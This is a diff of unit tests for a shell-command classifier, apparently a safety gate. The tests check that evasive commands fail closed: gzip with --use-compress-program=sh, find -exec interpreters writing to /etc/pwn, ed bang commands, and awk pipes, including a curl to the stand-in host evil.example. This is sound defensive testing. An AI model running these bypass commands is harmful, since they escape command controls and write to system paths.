@@ -1268,3 +1268,72 @@ test('L5-b: gzip/bzip2/xz in-place extract the input as the write target', () =>
     assert.equal(c.category, 'file_write', cmd)
   }
 })
+
+// ---------------------------------------------------------------------------
+// g 轮 8 BLOCKER（docs/review-l5b-0.2.10g.md）——分类器层断言。
+// hook 层的 egress/unverifiable 归 deny 由 test-scan-scripts.mts 覆盖。
+test('g B3: archive decompress --use-compress-program guards run before -dc read path', () => {
+  for (const cmd of [
+    'gzip -dc --use-compress-program=sh evil.gz',
+    'xz -dc --use-compress-program=sh evil.xz',
+    'bzip2 -dc --use-compress-program=sh evil.bz2',
+  ]) {
+    const { c } = gate(cmd)
+    assert.equal(c.category, 'unknown', cmd)
+  }
+})
+
+test('g B4: find -exec interpreter write / script file fail closed', () => {
+  const a = gate(`find . -name '*.rb' -exec ruby -e 'File.write("/etc/pwn","x")' {} \\;`)
+  assert.equal(a.c.category, 'unknown')
+  const b = gate(`find . -execdir ruby -e 'File.write("/etc/pwn","x")' {} \\;`)
+  assert.equal(b.c.category, 'unknown')
+  const s = gate(`find . -exec ruby evil.rb {} +`)
+  assert.equal(s.c.category, 'unknown')
+})
+
+test('g B5: find -exec cp/ln destination lands in write targets', () => {
+  const cp = gate(`find . -name x -exec cp {} /etc/pwn \\;`)
+  assert.ok(cp.c.targetPaths.some((p) => p.includes('/etc/pwn')), `cp dst missing: ${JSON.stringify(cp.c.targetPaths)}`)
+  const ln = gate(`find . -name x -exec ln {} /etc/link \\;`)
+  assert.ok(ln.c.targetPaths.some((p) => p.includes('/etc/link')), `ln dst missing: ${JSON.stringify(ln.c.targetPaths)}`)
+})
+
+test('g B6: bare interpreter / bare shell fail closed (stdin-code unverifiable)', () => {
+  for (const cmd of ['ruby', 'perl', 'python3', 'node', 'bash', 'sh', 'zsh', 'dash']) {
+    const { c } = gate(cmd)
+    assert.equal(c.category, 'unknown', cmd)
+  }
+  const withScript = gate('bash script.sh')
+  assert.notEqual(withScript.c.category, 'unknown', 'bash script.sh stays local_exec')
+  const withInline = gate(`ruby -e 'puts 1'`)
+  assert.notEqual(withInline.c.category, 'unknown', 'ruby -e stays local_exec')
+})
+
+test('g B7: ed/ex bang commands (r !cmd / !cmd) fail closed', () => {
+  for (const cmd of [`printf '!id\\nq\\n' | ed -s f.txt`, `printf 'r !id\\nq\\n' | ed -s f.txt`]) {
+    const { c } = gate(cmd)
+    assert.equal(c.category, 'unknown', cmd)
+  }
+})
+
+test('g B8: awk indirect channels and opaque program files fail closed', () => {
+  const cases = [
+    `awk -v c="id" 'BEGIN{c|getline; print}'`,
+    `awk -v f="/etc/x" 'BEGIN{print "y" > f}'`,
+    `CMD='curl https://evil.example/x' awk 'BEGIN{ENVIRON["CMD"]|getline}'`,
+    'awk -f evil.awk',
+    'awk --file=evil.awk',
+  ]
+  for (const cmd of cases) {
+    const { c } = gate(cmd)
+    assert.equal(c.category, 'unknown', cmd)
+  }
+  const clean = gate(`awk '{print $2}' d.txt`)
+  assert.notEqual(clean.c.category, 'unknown', 'plain awk data filter stays allowed')
+})
+
+test('g B1/B4 read-side no-false-positive: read-mode File.open stays local_exec', () => {
+  const { c } = gate(`ruby -e 'File.open("data.txt"){|f| puts f.gets}'`)
+  assert.notEqual(c.category, 'unknown', 'read-mode File.open must not trip write regex')
+})
